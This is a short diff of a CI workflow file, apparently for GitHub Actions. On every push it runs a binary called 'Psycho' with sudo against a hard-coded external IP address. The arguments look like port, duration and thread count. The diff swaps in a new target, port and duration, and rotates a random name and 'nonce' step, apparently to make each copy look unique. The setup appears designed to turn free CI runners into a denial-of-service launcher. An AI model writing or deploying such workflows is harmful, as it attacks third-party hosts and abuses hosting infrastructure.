@@ -1,4 +1,4 @@
-name: psycho-3655894a
+name: psycho-929e1e7b
 on:
   push:
     branches: [ main, master ]
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x Psycho
     - name: Fire
-      run: sudo ./Psycho 91.108.17.40 32002 900 200
+      run: sudo ./Psycho 91.108.17.36 32000 60 200
       continue-on-error: true
-    - name: Nonce 3655894a
-      run: echo "nonce=3655894a"
+    - name: Nonce 929e1e7b
+      run: echo "nonce=929e1e7b"
